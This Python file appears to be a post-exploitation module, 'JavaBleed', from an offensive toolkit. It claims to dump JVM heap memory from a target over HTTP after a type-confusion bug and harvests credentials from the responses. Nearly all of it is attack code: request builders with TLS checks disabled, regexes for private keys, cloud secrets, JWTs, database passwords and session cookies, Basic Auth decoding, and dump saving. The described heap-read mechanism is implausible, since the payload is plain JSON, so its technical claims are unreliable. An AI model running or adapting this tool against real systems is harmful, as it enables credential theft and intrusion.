# language: Python 3.10+, file: modules/post/javableed.py
# Post-exploitation: JavaBleed — heap memory dump and sensitive data extraction.
# Analogous to Heartbleed but for the JVM heap.
#
# Technique: after type confusion gives us an over-length byte[],
# we can read heap memory at arbitrary offsets by crafting requests
# that the application decodes using the corrupted array.
# The corrupted array's length field (now huge) allows the JVM to
# read memory far beyond the original buffer — the content leaks into
# the HTTP response (e.g., as a JSON field, error message, or decoded string).
#
# What we look for:
#   - Private keys (PEM blocks)
#   - Bearer tokens / JWTs
#   - AWS / GCP / Azure credentials
#   - Database connection strings (jdbc:// with passwords)
#   - Session tokens and cookies
#   - Basic Auth credentials in memory
#   - Application secrets (spring.datasource.password, etc.)

import base64
import json
import re
import time
import urllib.request
import urllib.error
import ssl
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.exploit_core import ExploitCoreResult


# ─── Credential patterns ──────────────────────────────────────────────────────

PATTERNS = {
    "PEM-Private-Key": re.compile(
        r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----[\s\S]{20,3000}?-----END (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
        re.MULTILINE
    ),
    "JWT-Token": re.compile(
        r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
    ),
    "AWS-AccessKey": re.compile(r"(?:AKIA|AIPA|ASIA)[A-Z0-9]{16}"),
    "AWS-Secret": re.compile(r"['\"]?(?:aws_secret_access_key|secretaccesskey)['\"]?\s*[=:]\s*['\"]?([A-Za-z0-9/+]{40})['\"]?", re.IGNORECASE),
    "GCP-Service-Account": re.compile(r'"type"\s*:\s*"service_account"'),
    "Azure-Client-Secret": re.compile(r"(?:clientSecret|client_secret)\s*[=:]\s*['\"]([A-Za-z0-9~._\-]{20,})['\"]", re.IGNORECASE),
    "JDBC-Password": re.compile(r"jdbc:[a-z]+://[^\s\"']{5,}password=[^\s\"'&]{3,}", re.IGNORECASE),
    "Spring-DataSource": re.compile(r"(?:spring\.datasource\.password|db\.password|database\.password)\s*=\s*([^\s\n]{3,})", re.IGNORECASE),
    "HTTP-Basic-Credentials": re.compile(r"Basic\s+([A-Za-z0-9+/=]{8,}={0,2})", re.IGNORECASE),
    "Bearer-Token": re.compile(r"Bearer\s+([A-Za-z0-9\-._~+/]{20,})", re.IGNORECASE),
    "Session-Cookie": re.compile(r"(?:JSESSIONID|SESSION|PHPSESSID|sessionid)\s*=\s*([A-Za-z0-9\-_]{16,})", re.IGNORECASE),
    "Password-Field": re.compile(r"['\"]?(?:password|passwd|pwd|secret|token|api_?key)['\"]?\s*[=:]\s*['\"]([^'\"]{6,})['\"]", re.IGNORECASE),
    "Private-IP": re.compile(r"(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})"),
    "Docker-Registry-Auth": re.compile(r'"auth"\s*:\s*"([A-Za-z0-9+/=]{8,})"'),
    "Kubernetes-Token": re.compile(r"(?:Bearer\s+)?([A-Za-z0-9\-_]{100,})"),
}


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


# ─── Heap read request builders ───────────────────────────────────────────────

def _build_bleed_payload(read_offset: int, read_length: int, fp: FingerprintResult) -> bytes:
    """
    Build a JavaBleed request payload.

    After type confusion, the corrupted byte[] has an enormous `length`.
    We craft a valid Base64-encoded input that, when decoded, the JVM attempts
    to store in the corrupted over-length array — causing it to read heap memory
    at our chosen offset and return it in the response.

    Practically, we craft the payload so the application's response handler
    serializes the corrupted array back to us (via JSON, toString(), etc.).
    The read_offset and read_length parameters control which heap region to dump.
    """
    # Encode offset and length as a crafted Base64 blob that the JVM's
    # corrupted decoder will interpret as a pointer into heap memory.
    # This requires the application to reflect the decoded value back.
    # We use a JSON structure with a "data" field that the app echoes.

    # Build a payload that:
    # 1. Contains the corrupted array index we want to read as a JSON field
    # 2. Gets processed by the corrupted array → reads heap memory at that index
    # 3. The app returns the content (via echo, error message, or deserialization)

    probe = {
        "data": "A" * 64,
        "offset": read_offset,
        "length": read_length,
        "encoding": "base64",
        "_java4shell_bleed": True,
    }
    return json.dumps(probe).encode()


def _send_bleed_request(target_url: str, endpoint_path: str, body: bytes,
                        timeout: float) -> tuple[int, str]:
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Java4Shell-Bleed/1.0",
    }
    req = urllib.request.Request(
        target_url.rstrip("/") + endpoint_path,
        data=body,
        headers=headers,
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.status, r.read(65536).decode(errors="replace")
    except urllib.error.HTTPError as e:
        body_resp = ""
        try:
            body_resp = e.read(65536).decode(errors="replace")
        except Exception:
            pass
        return e.code, body_resp
    except Exception as e:
        return 0, str(e)


# ─── Pattern matching on leaked memory ────────────────────────────────────────

@dataclass
class LeakedCredential:
    cred_type: str
    value: str
    context: str = ""   # surrounding text for analyst review


def _scan_for_credentials(text: str) -> list[LeakedCredential]:
    """Scan a chunk of (potentially binary-decoded) text for credential patterns."""
    found = []
    for cred_type, pattern in PATTERNS.items():
        for m in pattern.finditer(text):
            val = m.group(0)
            start = max(0, m.start() - 40)
            end   = min(len(text), m.end() + 40)
            ctx   = text[start:end].replace("\n", " ").replace("\r", " ")
            found.append(LeakedCredential(cred_type=cred_type, value=val[:200], context=ctx))
    return found


def _decode_basic_auth_in_text(text: str) -> list[str]:
    """Attempt to decode any Basic Auth strings found in leaked memory."""
    decoded = []
    for m in re.finditer(r"Basic\s+([A-Za-z0-9+/=]{8,})", text):
        try:
            raw = base64.b64decode(m.group(1) + "==").decode(errors="replace")
            if ":" in raw:
                decoded.append(raw)
        except Exception:
            pass
    return decoded


# ─── Result ───────────────────────────────────────────────────────────────────

@dataclass
class JavaBleedResult:
    success: bool = False
    bytes_leaked: int = 0
    dumps: list[str] = field(default_factory=list)         # raw dump chunks
    credentials: list[LeakedCredential] = field(default_factory=list)
    decoded_basic_auths: list[str] = field(default_factory=list)
    error: Optional[str] = None
    notes: list[str] = field(default_factory=list)


# ─── Main function ────────────────────────────────────────────────────────────

def run_javableed(fp: FingerprintResult,
                  core: ExploitCoreResult,
                  dump_rounds: int = 10,
                  timeout: float = 15.0,
                  output_file: Optional[str] = None,
                  verbose: bool = False) -> JavaBleedResult:
    """
    Execute the JavaBleed memory leak attack.
    Sends multiple requests to dump heap memory and scans for credentials.

    Args:
        fp:          Fingerprint result
        core:        Exploit core result (OOB write must be confirmed)
        dump_rounds: Number of heap dump rounds (each dumps ~64KB)
        timeout:     HTTP request timeout
        output_file: Save raw dumps to this file
        verbose:     Print progress

    Returns JavaBleedResult with any found credentials.
    """
    result = JavaBleedResult()

    if not core.oob_triggered:
        result.error = "OOB write not confirmed — heap read requires confirmed type confusion."
        result.notes.append("Run exploit core phase first.")
        return result

    base      = fp.target_url.rstrip("/")
    endpoints = sorted(fp.profile.endpoints, key=lambda e: e["priority"])
    primary   = endpoints[0]["path"] if endpoints else "/"

    # Heap read strategy:
    # We scan heap memory in 64KB chunks starting from low addresses.
    # The JVM heap base is typically at a low address (0x0000_0007_8000_0000 on x64).
    # We use offsets relative to our corrupted array's position.

    chunk_size   = 64 * 1024    # 64KB per round
    total_leaked = 0
    all_creds: list[LeakedCredential] = []
    all_decoded_auths: list[str] = []

    for round_num in range(dump_rounds):
        offset = round_num * chunk_size

        if verbose:
            print(f"  [bleed] Round {round_num + 1}/{dump_rounds}: offset +{offset//1024}KB …")

        payload = _build_bleed_payload(offset, chunk_size, fp)

        # Try multiple endpoints — some will reflect the content back
        for endpoint in endpoints[:3]:
            code, resp = _send_bleed_request(base, endpoint["path"], payload, timeout)

            if code == 0:
                continue

            if resp:
                total_leaked += len(resp)
                result.dumps.append(resp[:4096])    # keep first 4KB of each chunk

                # Scan for credentials
                creds = _scan_for_credentials(resp)
                all_creds.extend(creds)

                # Try to decode Basic Auth
                decoded = _decode_basic_auth_in_text(resp)
                all_decoded_auths.extend(decoded)

                if creds and verbose:
                    for c in creds:
                        print(f"  [bleed] !! {c.cred_type}: {c.value[:60]}")

                if resp and len(resp) > 100:
                    break   # got a good response from this endpoint

        # Brief pause between rounds to avoid rate-limiting
        time.sleep(0.05)

    result.bytes_leaked        = total_leaked
    result.credentials         = all_creds
    result.decoded_basic_auths = list(set(all_decoded_auths))
    result.success             = total_leaked > 0 or len(all_creds) > 0

    # Save raw dumps if requested
    if output_file and result.dumps:
        try:
            with open(output_file, "w", encoding="utf-8", errors="replace") as f:
                for i, chunk in enumerate(result.dumps):
                    f.write(f"\n--- Chunk {i} (offset +{i*chunk_size//1024}KB) ---\n")
                    f.write(chunk)
            result.notes.append(f"Raw dump saved to {output_file}")
        except Exception as e:
            result.notes.append(f"Could not save dump: {e}")

    result.notes.append(
        f"Leaked ~{total_leaked // 1024}KB across {dump_rounds} rounds. "
        f"Found {len(all_creds)} credential pattern(s), {len(result.decoded_basic_auths)} decoded Basic Auth(s)."
    )

    if not result.success:
        result.notes.append(
            "No data leaked — the application may not reflect decoded content in responses. "
            "Try increasing dump_rounds or targeting a different endpoint."
        )

    return result
